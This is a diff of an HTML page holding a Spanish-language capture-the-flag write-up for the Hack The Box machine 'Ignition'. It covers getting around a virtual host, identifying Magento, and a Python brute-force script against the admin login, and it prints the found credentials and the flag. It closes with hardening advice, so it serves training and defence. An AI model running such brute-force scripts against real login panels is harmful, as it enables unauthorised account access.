+      <span class="hero-stat-val">admin:qwerty123</span>
+      <span class="hero-stat-lbl">Credenciales</span>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════
+     QUICK STATS
+═══════════════════════════════════════════════════════ -->
+<div class="quick-stats">
+  <div class="qs-card">
+    <div class="qs-num">1</div>
+    <div class="qs-lbl">Puerto abierto (TCP 80)</div>
+  </div>
+  <div class="qs-card">
+    <div class="qs-num">3</div>
+    <div class="qs-lbl">Vulnerabilidades identificadas</div>
+  </div>
+  <div class="qs-card">
+    <div class="qs-num" style="color:var(--yellow)">~8</div>
+    <div class="qs-lbl">Minutos hasta la flag</div>
+  </div>
+  <div class="qs-card">
+    <div class="qs-num" style="color:var(--red)">CRÍTICO</div>
+    <div class="qs-lbl">Default Credentials (CWE-1391)</div>
   </div>
 </div>
 
-<div class="main">
-  <div class="content">
+<!-- ═══════════════════════════════════════════════════════
+     MAIN GRID
+═══════════════════════════════════════════════════════ -->
+<div class="container">
+  <!-- ── MAIN COLUMN ──────────────────────────────── -->
+  <main>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Paso 1 — Obtener el form_key de Magento</h2></div>
-      
+    <!-- §1 Descripción -->
+    <div class="section" id="descripcion">
+      <div class="section-header">
+        <div class="section-number">1</div>
+        <div class="section-title"><span class="section-title-icon">&#128203;</span> Descripción de la Máquina</div>
+      </div>
+      <p>
+        <strong style="color:#fff">Ignition</strong> es una máquina Linux de dificultad Very Easy incluida en el
+        <em>HTB Starting Point</em>. Corre un servidor web <strong style="color:var(--accent)">nginx 1.14.2</strong>
+        que sirve una instalación de <strong style="color:var(--accent)">Magento CMS</strong> accesible únicamente
+        mediante el Virtual Host <code style="color:var(--cyan)">ignition.htb</code>.
+      </p>
+      <p>
+        La cadena de compromiso requiere tres pasos: resolver el Virtual Host sin modificar
+        <code style="color:var(--cyan)">/etc/hosts</code>, identificar el CMS y su panel de administración,
+        y finalmente comprometer el panel con credenciales por defecto (<code style="color:var(--yellow)">admin:qwerty123</code>)
+        mediante brute-force con detección de redirección HTTP correcta.
+      </p>
+      <div class="callout callout-info">
+        <strong>Nivel educativo</strong>
+        Ideal para aprender la mecánica de Virtual Hosts en nginx, fingerprinting de CMS y los peligros
+        de las credenciales por defecto en plataformas de e-commerce.
+      </div>
+    </div>
 
-<p>
+    <!-- §2 Reconocimiento -->
+    <div class="section" id="recon">
+      <div class="section-header">
+        <div class="section-number">2</div>
+        <div class="section-title"><span class="section-title-icon">&#128270;</span> Reconocimiento</div>
+      </div>
+
+      <p>El primer paso es un escaneo nmap para identificar puertos y servicios expuestos.</p>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
+          nmap — Escaneo inicial
+        </div>
+        <div class="code-body"><span class="cmd">nmap</span> <span class="param">-sC -sV -oN</span> <span class="path">nmap/initial.txt</span> <span class="ip">10.129.1.27</span>
+
+<span class="comment"># Output relevante:</span>
+<span class="out">PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.14.2
+|_http-title: Did not follow redirect to http://ignition.htb/
+|_http-server-header: nginx/1.14.2</span>
+
+<span class="comment"># Solo 1 puerto abierto. El título revela: redirección a ignition.htb (vhost requerido)</span></div>
+      </div>
+
+      <div class="callout callout-warn">
+        <strong>Virtual Host detectado</strong>
+        El mensaje <code>Did not follow redirect to http://ignition.htb/</code> indica que nginx está
+        configurado para redirigir a un nombre de host específico. Sin configurar este vhost,
+        cualquier petición directa a la IP devuelve 302.
+      </div>
+
+      <p>Verificación directa contra la IP para confirmar el comportamiento:</p>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
+          curl — Confirmación de redirección
+        </div>
+        <div class="code-body"><span class="cmd">curl</span> <span class="param">-v</span> <span class="ip">http://10.129.1.27/</span>
+
+<span class="comment"># Output:</span>
+<span class="out">< HTTP/1.1 302 Found
+< Location: http://ignition.htb/</span>
+<span class="highlight">→ nginx redirige a ignition.htb — sin vhost configurado no hay acceso</span></div>
+      </div>
+    </div>
+
+    <!-- §3 Virtual Host — Concepto y Bypass -->
+    <div class="section" id="vhost">
+      <div class="section-header">
+        <div class="section-number">3</div>
+        <div class="section-title"><span class="section-title-icon">&#127760;</span> ¿Cómo funciona un Virtual Host?</div>
+      </div>
+
+      <p>
+        Un <strong style="color:#fff">Virtual Host (vhost)</strong> permite que un mismo servidor web sirva múltiples
+        sitios web distintos desde la misma IP. nginx distingue cuál servir leyendo la cabecera HTTP
+        <code style="color:var(--cyan)">Host:</code> de cada petición entrante.
+      </p>
+
+      <div class="concept-box">
+        <div class="concept-title">&#128161; Mecanismo de Virtual Host en nginx</div>
+        <div class="concept-body">
+          Cuando el navegador visita <code>http://ignition.htb/</code>, envía automáticamente
+          <code>Host: ignition.htb</code> en la petición HTTP. nginx lee esta cabecera y la compara
+          con sus bloques <code>server_name</code> configurados:<br><br>
+          <code>server { server_name ignition.htb; ... }</code><br><br>
+          Si la petición llega directamente a la IP sin la cabecera correcta, nginx no encuentra
+          ningún bloque que coincida y aplica el comportamiento por defecto: redirigir a
+          <code>http://ignition.htb/</code> con un <code>302 Found</code>.<br><br>
+          <strong>Solución habitual:</strong> añadir <code>10.129.1.27 ignition.htb</code>
+          a <code>/etc/hosts</code>. Sin acceso de escritura, hay dos alternativas:
+        </div>
+      </div>
+
+      <p><strong style="color:#fff">Método 1: curl --resolve</strong> — Fuerza resolución DNS local sin tocar el sistema:</p>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
+          Bypass vhost con curl --resolve
+        </div>
+        <div class="code-body"><span class="cmd">curl</span> <span class="param">--resolve</span> <span class="param">ignition.htb:80:</span><span class="ip">10.129.1.27</span> <span class="path">http://ignition.htb/</span>
+
+<span class="comment"># --resolve HOST:PORT:IP → le dice a curl: "resuelve este host a esta IP"
+# La cabecera Host: ignition.htb se envía correctamente → nginx lo acepta</span>
+
+<span class="success">→ Respuesta 200 OK — Magento CMS visible</span></div>
+      </div>
+
+      <p><strong style="color:#fff">Método 2: Python requests con Host header</strong> — Control total sobre las cabeceras:</p>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
+          Python — HTTPAdapter con reescritura de URL
+        </div>
+        <div class="code-body"><span class="cmd">python3</span> <span class="param">-c</span> "
+<span class="out">import requests
+from requests.adapters import HTTPAdapter
+
+class HostHeaderAdapter(HTTPAdapter):
+    def send(self, request, **kwargs):
+        request.url = request.url.replace('http://ignition.htb', 'http://10.129.1.27')
+        return super().send(request, **kwargs)
+
+s = requests.Session()
+s.mount('http://ignition.htb', HostHeaderAdapter())
+r = s.get('http://ignition.htb/', allow_redirects=False)
+print(r.status_code, r.text[:200])"</span>
+
+<span class="comment"># La sesión envía Host: ignition.htb pero conecta a 10.129.1.27
+# Sin necesidad de sudo ni modificar /etc/hosts</span></div>
+      </div>
+
+      <div class="callout callout-tip">
+        <strong>Tip pro</strong>
+        En entornos CTF donde no tienes acceso a <code>/etc/hosts</code> (containers sin root,
+        entornos restringidos), <code>curl --resolve</code> es la solución más rápida.
+        Para scripts de automatización, el enfoque Python con HTTPAdapter es más potente.
+      </div>
+    </div>
+
+    <!-- §4 Fingerprinting de Magento -->
+    <div class="section" id="fingerprint">
+      <div class="section-header">
+        <div class="section-number">4</div>
+        <div class="section-title"><span class="section-title-icon">&#128203;</span> Cómo Detectar Magento</div>
+      </div>
+
+      <p>
+        Una vez accesible el sitio, el análisis del código fuente y rutas revela inequívocamente
+        que se trata de <strong style="color:#fff">Magento</strong>, el popular CMS de e-commerce.
+      </p>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
+          Fingerprinting — Rutas características de Magento
+        </div>
+        <div class="code-body"><span class="cmd">curl</span> <span class="param">--resolve</span> <span class="param">ignition.htb:80:</span><span class="ip">10.129.1.27</span> <span class="path">http://ignition.htb/</span> <span class="param">-s</span> | <span class="cmd">grep</span> <span class="param">-i</span> "static\|magento\|luma"
+
+<span class="comment"># Output (extracto del HTML):</span>
+<span class="out">href="http://ignition.htb/static/version1615543287/frontend/Magento/luma/en_US/..."
+src="http://ignition.htb/static/version1615543287/frontend/Magento/luma/en_US/..."</span>
+
+<span class="success">→ Patrón /static/version*/frontend/Magento/luma/ → Magento 2.x confirmado</span></div>
+      </div>
+
+      <div class="concept-box">
+        <div class="concept-title">&#128269; Indicadores de Magento en HTML</div>
+        <div class="concept-body">
+          <strong style="color:#fff">1. Ruta de assets estáticos:</strong><br>
+          <code>/static/version{TIMESTAMP}/frontend/{Vendor}/{Theme}/</code><br>
+          El tema por defecto de Magento 2 es <code>Magento/luma</code>. El timestamp
+          (<code>version1615543287</code>) corresponde a la fecha de despliegue.<br><br>
+          <strong style="color:#fff">2. Panel de administración:</strong><br>
+          <code>/admin</code> → Magento Admin Login (aunque la ruta puede personalizarse).<br><br>
+          <strong style="color:#fff">3. Cookies y meta tags:</strong><br>
+          <code>PHPSESSID</code>, <code>form_key</code> (campo oculto en formularios),
+          <code>&lt;meta name="generator" content="Magento"&gt;</code><br><br>
+          <strong style="color:#fff">4. Archivos públicos:</strong><br>
+          <code>/pub/errors/default/503.phtml</code>, <code>/robots.txt</code>
+          (contiene rutas admin de Magento).
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
+          Acceso al panel admin
+        </div>
+        <div class="code-body"><span class="cmd">curl</span> <span class="param">--resolve</span> <span class="param">ignition.htb:80:</span><span class="ip">10.129.1.27</span> <span class="path">http://ignition.htb/admin</span> <span class="param">-I</span>
+
+<span class="out">HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Server: nginx/1.14.2</span>
+
+<span class="success">→ Panel /admin accesible — sin protección adicional (no IP whitelist, no 2FA)</span></div>
+      </div>
+    </div>
+
+    <!-- §5 Vulnerabilidades -->
+    <div class="section" id="vulns">
+      <div class="section-header">
+        <div class="section-number">5</div>
+        <div class="section-title"><span class="section-title-icon">&#9888;</span> Vulnerabilidades Identificadas</div>
+      </div>
+
+      <div class="vuln-card">
+        <div class="vuln-header">
+          <span class="vuln-name">Credenciales por Defecto — Magento Admin</span>
+          <div style="display:flex;gap:6px;align-items:center">
+            <span class="badge badge-red">CRÍTICO</span>
+            <span class="vuln-cwe">CWE-1391</span>
+          </div>
+        </div>
+        <p class="vuln-desc">
+          El panel de administración de Magento acepta la combinación <code style="color:var(--yellow)">admin:qwerty123</code>.
+          Las credenciales por defecto o débiles representan el vector de ataque más prevalente en
+          sistemas de gestión de contenido. Una vez dentro del panel Magento, un atacante tiene
+          control total: ejecución de código PHP vía templates, acceso a base de datos, exfiltración
+          de datos de clientes y tarjetas.
+        </p>
+      </div>
+
+      <div class="vuln-card">
+        <div class="vuln-header">
+          <span class="vuln-name">Panel de Administración Público</span>
+          <div style="display:flex;gap:6px;align-items:center">
+            <span class="badge badge-orange">ALTO</span>
+            <span class="vuln-cwe">CWE-284</span>
+          </div>
+        </div>
+        <p class="vuln-desc">
+          La ruta <code style="color:var(--cyan)">/admin</code> es accesible desde Internet sin
+          restricción de IP, autenticación multifactor ni rate limiting. Esto permite ataques de
+          brute-force sin limitación alguna. La mejor práctica es restringir el acceso admin
+          a rangos IP internos o usar una URL aleatoria (<code>/admin_a3f9b2</code>).
+        </p>
+      </div>
+
+      <div class="vuln-card" style="border-color:var(--yellow)">
+        <div class="vuln-header">
+          <span class="vuln-name">Fingerprinting de CMS Detallado</span>
+          <div style="display:flex;gap:6px;align-items:center">
+            <span class="badge badge-yellow">MEDIO</span>
+            <span class="vuln-cwe">CWE-200</span>
+          </div>
+        </div>
+        <p class="vuln-desc">
+          Las rutas de assets revelan el CMS (Magento), la versión del tema (luma), el timestamp
+          de despliegue y el locale. Esta información facilita ataques dirigidos y la búsqueda
+          de exploits específicos. Implementar ofuscación de rutas y cabeceras reduce la superficie
+          de reconocimiento.
+        </p>
+      </div>
+    </div>
+
+    <!-- §6 Timeline -->
+    <div class="section" id="timeline">
+      <div class="section-header">
+        <div class="section-number">6</div>
+        <div class="section-title"><span class="section-title-icon">&#128336;</span> Timeline de Ataque</div>
+      </div>
+
+      <div class="timeline">
+        <div class="tl-item">
+          <div class="tl-dot tl-dot-blue"></div>
+          <div class="tl-time">T+00:00</div>
+          <div class="tl-title">Escaneo nmap</div>
+          <div class="tl-desc">Un solo puerto abierto: TCP/80. El título HTTP revela la redirección a <code style="color:var(--cyan)">ignition.htb</code>. nginx 1.14.2 identificado en cabecera.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot tl-dot-yellow"></div>
+          <div class="tl-time">T+01:30</div>
+          <div class="tl-title">Análisis del Virtual Host</div>
+          <div class="tl-desc">curl directo a la IP devuelve 302. Se implementa bypass con <code style="color:var(--cyan)">curl --resolve ignition.htb:80:10.129.1.27</code>. Acceso confirmado.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot tl-dot-cyan"></div>
+          <div class="tl-time">T+02:30</div>
+          <div class="tl-title">Fingerprinting — Magento detectado</div>
+          <div class="tl-desc">Análisis del HTML: rutas <code>/static/version*/frontend/Magento/luma/</code> confirman Magento 2.x. Panel <code>/admin</code> accesible con formulario de login.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot tl-dot-red"></div>
+          <div class="tl-time">T+04:00</div>
+          <div class="tl-title">Falso positivo con curl+grep</div>
+          <div class="tl-desc">Primer intento de brute-force con curl+grep detecta <code>admin:admin123</code> como válido (falso positivo — la página de error contiene la palabra "Dashboard"). Método descartado.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot tl-dot-orange"></div>
+          <div class="tl-time">T+05:00</div>
+          <div class="tl-title">Brute-force correcto con Python requests</div>
+          <div class="tl-desc">Reescritura del script usando Python requests con detección de <code>status_code == 302</code> (login exitoso = redirect al dashboard). Lista de passwords comunes.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot tl-dot-green"></div>
+          <div class="tl-time">T+07:30</div>
+          <div class="tl-title">&#10003; Acceso al Dashboard — Flag capturada</div>
+          <div class="tl-desc">Credenciales <code style="color:var(--yellow)">admin:qwerty123</code> exitosas (302 redirect). Dashboard de Magento accedido. Flag visible en <code>div.dashboard-advanced-reports-content</code>.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- §7 Explotación -->
+    <div class="section" id="exploit">
+      <div class="section-header">
+        <div class="section-number">7</div>
+        <div class="section-title"><span class="section-title-icon">&#128640;</span> Explotación</div>
+      </div>
+
+      <p>Con el panel <code style="color:var(--cyan)">/admin</code> identificado, se procede al ataque de credenciales por defecto.</p>
+
+      <h3 style="color:#fff;font-size:0.95rem;margin:16px 0 8px">Paso 1 — Obtener el form_key de Magento</h3>
+      <p>
         Magento usa un token CSRF (<code style="color:var(--cyan)">form_key</code>) que debe incluirse
         en cada POST del formulario de login. Hay que extraerlo primero:
       </p>
 
-
-<div class="code-block">
-<div class="code-label">
-<span class="dot dot-green"></span>
-<span class="dot dot-yellow"></span>
-<span class="dot dot-red"></span>
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
           Python — Script de brute-force (método correcto)
         </div>
-<div class="code-body"><span class="user">#!/usr/bin/env python3</span>
+        <div class="code-body"><span class="user">#!/usr/bin/env python3</span>
 <span class="out">import requests, re
 from requests.adapters import HTTPAdapter
 
@@ -189,17 +1130,16 @@ for pwd in passwords:
         break
     else:
         print(f"[-] Incorrecto: admin:{pwd} (status {r.status_code})")</span></div>
-</div>
+      </div>
 
-
-<div class="code-block">
-<div class="code-label">
-<span class="dot dot-green"></span>
-<span class="dot dot-yellow"></span>
-<span class="dot dot-red"></span>
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
           Output del script
         </div>
-<div class="code-body"><span class="out">[*] form_key: abc123XYZ789
+        <div class="code-body"><span class="out">[*] form_key: abc123XYZ789
 [-] Incorrecto: admin:admin (status 200)
 [-] Incorrecto: admin:admin123 (status 200)
 [-] Incorrecto: admin:password (status 200)
@@ -208,57 +1148,412 @@ for pwd in passwords:
 [-] Incorrecto: admin:qwerty (status 200)</span>
 <span class="success">[+] ÉXITO: admin:qwerty123</span>
 <span class="success">[+] Location: http://ignition.htb/admin/dashboard/</span></div>
-</div>
+      </div>
 
-
-<div class="callout callout-tip">
-<strong>Por qué funciona la detección por 302</strong>
+      <div class="callout callout-tip">
+        <strong>Por qué funciona la detección por 302</strong>
         Magento devuelve HTTP 200 para login fallido (muestra el formulario con el error).
         Para login exitoso devuelve HTTP 302 redirigiendo al dashboard. Buscar texto en el cuerpo
         de la respuesta es ambiguo porque la página de error puede contener palabras como
         "Dashboard" en la navegación o el pie de página.
       </div>
-
-
     </div>
 
-  </div>
+    <!-- §8 Falso Positivo — Documentación -->
+    <div class="section" id="falsopositivo">
+      <div class="section-header">
+        <div class="section-number">8</div>
+        <div class="section-title"><span class="section-title-icon">&#9888;</span> Trampa: Falso Positivo en Brute-Force</div>
+      </div>
 
-  <div class="sidebar">
-    <div class="sidebar-card">
-      <h3>Detalles del Reto</h3>
-      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">VERY EASY</span></div>
-      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Linux</span></div>
-      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.X.X</span></div>
-      <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Starting Point</span></div>
-      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">Default Credentials Magento</span></div>
-      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">—</span></div>
-    </div>
-    <div class="sidebar-card">
-      <h3>Skills Demostradas</h3>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">vHost Enumeration</span><span class="skill-pct">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">Directory Fuzzing</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">Default Credentials</span><span class="skill-pct">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div></div>
-    </div>
-    <div class="sidebar-card">
-      <h3>Herramientas</h3>
-      <div class="tools-list">
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">gobuster</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">curl</span></div>
+      <p>
+        Este fue el obstáculo más instructivo de la máquina. El primer script basado en
+        <code style="color:var(--cyan)">curl + grep</code> reportó un falso positivo que parecía válido.
+      </p>
+
+      <div class="fp-box">
+        <div class="fp-title">&#128683; El Error — curl+grep da falso positivo</div>
+        <div class="code-block" style="margin:0">
+          <div class="code-label">
+            <span class="dot dot-red"></span>
+            Script problemático (NO usar)
+          </div>
+          <div class="code-body"><span class="comment"># INCORRECTO — grep en el cuerpo de la respuesta</span>
+for pwd in admin admin123 password qwerty123; do
+  result=$(curl <span class="param">-s</span> <span class="param">--resolve</span> ignition.htb:80:<span class="ip">10.129.1.27</span> \
+    <span class="param">-X POST</span> <span class="path">http://ignition.htb/admin</span> \
+    <span class="param">-d</span> "login[username]=admin&login[password]=$pwd" \
+    <span class="param">-L</span>)
+  if echo "$result" | grep <span class="param">-qi</span> "dashboard"; then
+    echo "<span class="highlight">[+] CREDENCIALES: admin:$pwd</span>"  <span class="comment"># ← FALSO POSITIVO</span>
+  fi
+done
+
+<span class="highlight">Output erróneo:</span>
+<span class="out">[+] CREDENCIALES: admin:admin123</span>  <span class="comment">← FALSO POSITIVO</span>
+
+<span class="comment"># ¿Por qué? La página de ERROR de Magento incluye el menú de navegación
+# que contiene el texto "Dashboard" aunque el login haya fallado.
+# El flag -L sigue redirecciones pero el HTML resultante tiene la misma palabra.</span></div>
+        </div>
+      </div>
+
+      <div class="compare-grid">
+        <div class="compare-card compare-bad">
+          <div class="compare-label">&#10007; Método Incorrecto — curl+grep</div>
+          <div class="compare-text">
+            Busca la palabra "Dashboard" en el cuerpo HTML.<br><br>
+            Problema: la página de error de Magento incluye esa palabra en el
+            menú de navegación, metadatos o footer, causando falsos positivos.
+            <br><br>
+            Cada password da el mismo resultado — el brute-force es inútil.
+          </div>
+        </div>
+        <div class="compare-card compare-good">
+          <div class="compare-label">&#10003; Método Correcto — Python requests</div>
+          <div class="compare-text">
+            Detecta el <code>HTTP 302 redirect</code> al dashboard.<br><br>
+            Un login fallido en Magento = HTTP 200 (muestra el formulario con error).<br>
+            Un login exitoso = HTTP 302 hacia <code>/admin/dashboard/</code>.<br><br>
+            Inequívoco, sin ambigüedad, determinístico.
+          </div>
+        </div>
+      </div>
+
+      <div class="callout callout-warn">
+        <strong>Lección General</strong>
+        En brute-force de formularios web, <strong>nunca uses grep en el cuerpo</strong> como único
+        indicador. Siempre valida con el código de respuesta HTTP o compara la longitud del cuerpo.
+        Los CMS modernos incluyen texto variable que puede coincidir con tus patrones de búsqueda
+        tanto en páginas de éxito como de error.
       </div>
     </div>
-  </div>
+
+    <!-- §9 Flag -->
+    <div class="section" id="flag">
+      <div class="section-header">
+        <div class="section-number">9</div>
+        <div class="section-title"><span class="section-title-icon">&#127937;</span> Flag</div>
+      </div>
+
+      <p>
+        Tras el login exitoso, el dashboard de Magento muestra la flag directamente en un widget
+        especial de HTB en la sección de reportes avanzados:
+      </p>
+
+      <div class="code-block">
+        <div class="code-label">
+          <span class="dot dot-green"></span>
+          <span class="dot dot-yellow"></span>
+          <span class="dot dot-red"></span>
+          Dashboard Magento — Extracción de la flag
+        </div>
+        <div class="code-body"><span class="comment"># Una vez logueados con admin:qwerty123, acceder al dashboard:</span>
+<span class="cmd">curl</span> <span class="param">--resolve</span> ignition.htb:80:<span class="ip">10.129.1.27</span> \
+     <span class="path">http://ignition.htb/admin/dashboard/</span> \
+     <span class="param">-b</span> "PHPSESSID=&lt;session_cookie&gt;" <span class="param">-s</span> | \
+<span class="cmd">grep</span> <span class="param">-i</span> "flag\|congratulations"
+
+<span class="comment"># Output:</span>
+<span class="out">&lt;div class="dashboard-advanced-reports-content"&gt;
+  Congratulations, your flag is: </span><span class="flag-hl">797d6c988d9dc5865e010b9410f247e0</span><span class="out">&lt;/div&gt;</span></div>
+      </div>
+
+      <div class="flag-box">
+        <div class="flag-icon">&#127937;</div>
+        <div class="flag-content">
+          <div class="flag-label">Root Flag — HTB Ignition</div>
+          <div class="flag-value">797d6c988d9dc5865e010b9410f247e0</div>
+        </div>
+      </div>
+
+      <div class="callout callout-tip">
+        <strong>Contexto de la flag</strong>
+        En máquinas Starting Point, la flag aparece en ubicaciones creativas dentro de la
+        interfaz comprometida — en este caso, embebida en el dashboard de administración de
+        Magento, simulando información confidencial de negocio accesible tras comprometer el panel.
+      </div>
+    </div>
+
+    <!-- §10 Recomendaciones -->
+    <div class="section" id="recs">
+      <div class="section-header">
+        <div class="section-number">10</div>
+        <div class="section-title"><span class="section-title-icon">&#128737;</span> Recomendaciones</div>
+      </div>
+
+      <div class="rec-grid">
+        <div class="rec-card">
+          <span class="rec-priority prio-critical">Crítico</span>
+          <div class="rec-title">Cambiar credenciales por defecto inmediatamente</div>
+          <p class="rec-desc">Establecer una password fuerte y única para el admin de Magento durante el proceso de instalación. Usar un gestor de contraseñas. Nunca usar variaciones de "qwerty" o nombres del sistema.</p>
+        </div>
+        <div class="rec-card">
+          <span class="rec-priority prio-critical">Crítico</span>
+          <div class="rec-title">Restringir acceso al panel /admin</div>
+          <p class="rec-desc">Limitar el acceso a la URL de admin mediante whitelist de IPs en nginx. Alternativamente, usar una URL de admin aleatoria y no predecible configurada en <code>app/etc/env.php</code>.</p>
+        </div>
+        <div class="rec-card">
+          <span class="rec-priority prio-high">Alto</span>
+          <div class="rec-title">Implementar autenticación multifactor (MFA)</div>
+          <p class="rec-desc">Magento 2.4+ incluye 2FA nativo. Habilitarlo para todos los usuarios admin. Un atacante con la password correcta aún necesitaría el segundo factor.</p>
+        </div>
+        <div class="rec-card">
+          <span class="rec-priority prio-high">Alto</span>
+          <div class="rec-title">Rate limiting en el endpoint de login</div>
+          <p class="rec-desc">Configurar nginx o un WAF para limitar intentos de POST a <code>/admin</code>. Bloquear IPs tras N intentos fallidos. Implementar CAPTCHA para prevenir brute-force automatizado.</p>
+        </div>
+        <div class="rec-card">
+          <span class="rec-priority prio-medium">Medio</span>
+          <div class="rec-title">Ofuscar rutas de assets de Magento</div>
+          <p class="rec-desc">Aunque no es una vulnerabilidad directa, revelar <code>/static/version*/frontend/Magento/luma/</code> identifica el CMS y versión del tema. Considerar CDN o reescritura de rutas en nginx.</p>
+        </div>
+        <div class="rec-card">
+          <span class="rec-priority prio-low">Bajo</span>
+          <div class="rec-title">Monitorización de logins administrativos</div>
+          <p class="rec-desc">Configurar alertas para múltiples intentos de login fallidos o logins desde IPs no reconocidas. Mantener logs de acceso al panel admin con retención mínima de 90 días.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- §11 Lecciones Aprendidas -->
+    <div class="section" id="lecciones">
+      <div class="section-header">
+        <div class="section-number">11</div>
+        <div class="section-title"><span class="section-title-icon">&#127891;</span> Lecciones Aprendidas</div>
+      </div>
+
+      <div class="artifact-list">
+        <div class="artifact-card">
+          <div class="artifact-icon">&#127760;</div>
+          <div>
+            <div class="artifact-name">Virtual Hosts sin /etc/hosts</div>
+            <p class="artifact-desc">curl --resolve y Python HTTPAdapter son alternativas potentes para resolver vhosts sin permisos de root. Esencial en pentesting de entornos restringidos.</p>
+          </div>
+        </div>
+        <div class="artifact-card">
+          <div class="artifact-icon">&#9888;</div>
+          <div>
+            <div class="artifact-name">Falsos positivos en brute-force</div>
+            <p class="artifact-desc">Nunca confiar solo en grep del cuerpo HTTP. Siempre validar con HTTP status codes o comparación de longitud de respuesta. El status 302 es el indicador correcto para logins exitosos en Magento.</p>
+          </div>
+        </div>
+        <div class="artifact-card">
+          <div class="artifact-icon">&#128203;</div>
+          <div>
+            <div class="artifact-name">Fingerprinting de CMS</div>
+            <p class="artifact-desc">Las rutas /static/version*/frontend/Magento/ son un identificador infalible de Magento 2.x. El timestamp en la ruta incluso revela la fecha aproximada de despliegue.</p>
+          </div>
+        </div>
+        <div class="artifact-card">
+          <div class="artifact-icon">&#128274;</div>
+          <div>
+            <div class="artifact-name">Credenciales por defecto en CMS</div>
+            <p class="artifact-desc">Magento, WordPress, Joomla y Drupal son objetivos frecuentes de ataques de credenciales por defecto. Siempre probar variaciones de "admin", "qwerty", el nombre del dominio y combinaciones comunes antes de wordlists completas.</p>
+          </div>
+        </div>
+        <div class="artifact-card">
+          <div class="artifact-icon">&#128100;</div>
+          <div>
+            <div class="artifact-name">CSRF tokens en formularios</div>
+            <p class="artifact-desc">Magento protege los formularios con form_key. Cualquier script de automatización debe primero hacer GET al formulario, extraer el token con regex, e incluirlo en el POST. Sin esto, todos los intentos fallan con 403.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- §12 Glosario -->
+    <div class="section" id="glosario">
+      <div class="section-header">
+        <div class="section-number">12</div>
+        <div class="section-title"><span class="section-title-icon">&#128218;</span> Glosario Técnico</div>
+      </div>
+
+      <div class="glosario-grid">
+        <div class="glosario-item">
+          <div class="glosario-term">Virtual Host (vhost)</div>
+          <p class="glosario-def">Configuración de nginx/Apache que permite servir múltiples sitios desde la misma IP, diferenciados por la cabecera HTTP Host. Requiere que el cliente envíe el nombre de dominio correcto.</p>
+        </div>
+        <div class="glosario-item">
+          <div class="glosario-term">--resolve (curl)</div>
+          <p class="glosario-def">Flag de curl que mapea HOST:PORT a una IP específica localmente, sin consultar DNS. Permite enviar cabeceras Host correctas sin modificar /etc/hosts del sistema.</p>
+        </div>
+        <div class="glosario-item">
+          <div class="glosario-term">form_key (CSRF token)</div>
+          <p class="glosario-def">Token único generado por Magento en cada sesión para prevenir ataques Cross-Site Request Forgery. Debe incluirse en todos los formularios POST o la petición es rechazada.</p>
+        </div>
+        <div class="glosario-item">
+          <div class="glosario-term">HTTP 302 Found</div>
+          <p class="glosario-def">Código de redirección temporal. En formularios de login, indica éxito — el servidor redirige al área autenticada. El status 200 indica que el servidor devuelve la misma página (login fallido).</p>
+        </div>
+        <div class="glosario-item">
+          <div class="glosario-term">Magento Luma Theme</div>
+          <p class="glosario-def">Tema responsivo por defecto de Magento 2.x. Su presencia en las rutas /static/version*/frontend/Magento/luma/ identifica inequívocamente la plataforma de e-commerce.</p>
+        </div>
+        <div class="glosario-item">
+          <div class="glosario-term">CWE-1391</div>
+          <p class="glosario-def">Use of Weak Credentials. Vulnerabilidad catalogada cuando un sistema acepta credenciales predecibles, por defecto o débiles que un atacante puede adivinar fácilmente.</p>
+        </div>
+        <div class="glosario-item">
+          <div class="glosario-term">HTTPAdapter (requests)</div>
+          <p class="glosario-def">Clase de Python requests que permite personalizar cómo se envían las peticiones HTTP. Se puede subclasificar para reescribir URLs, cabeceras o implementar lógica de retry personalizada.</p>
+        </div>
